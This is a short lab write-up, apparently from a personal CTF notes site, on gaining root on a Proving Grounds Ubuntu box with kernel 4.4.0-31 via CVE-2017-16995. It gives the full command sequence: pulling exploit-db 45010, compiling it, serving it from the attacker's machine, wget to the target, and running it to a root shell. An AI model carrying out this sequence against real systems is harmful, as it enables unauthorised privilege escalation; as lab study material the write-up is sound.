---
layout: default
title: 4.4.0-31-generic
parent: Kernel Exploits
nav_order: 2
---

# 4.4.0-31-generic

---

## Check Kernal Version

```bash
loly@ubuntu:/home$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

This version of Ubuntu 4.4.0-31-generic is vulnerable to CVE-2017-16995.

![searchsploit](../../../../assets/images/ctfs/proving_grounds/loly/searchsploit.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
    Codes: CVE-2017-16995
 Verified: True
File Type: C source, ASCII text
Copied to: /home/vagrant/Documents/PG/PLAY/loly/45010.c



┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ gcc 45010.c -o 45010 --static

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Upload and run on the target to get root shell

```bash
loly@ubuntu:/home$ cd /tmp
loly@ubuntu:/tmp$ get http://192.168.45.217:8000/45010
No command 'get' found, but there are 18 similar ones
get: command not found
loly@ubuntu:/tmp$ wget http://192.168.45.217:8000/45010
--2023-11-14 18:50:07--  http://192.168.45.217:8000/45010
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776472 (758K) [application/octet-stream]
Saving to: ‘45010’

45010                     100%[=====================================>] 758.27K   857KB/s    in 0.9s

2023-11-14 18:50:08 (857 KB/s) - ‘45010’ saved [776472/776472]

loly@ubuntu:/tmp$ chmod +x 45010
loly@ubuntu:/tmp$ ./45010
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007a8aac00
[*] Leaking sock struct from ffff8800349703c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800773d2540
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff8800773d2540
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
# whoami
root

```
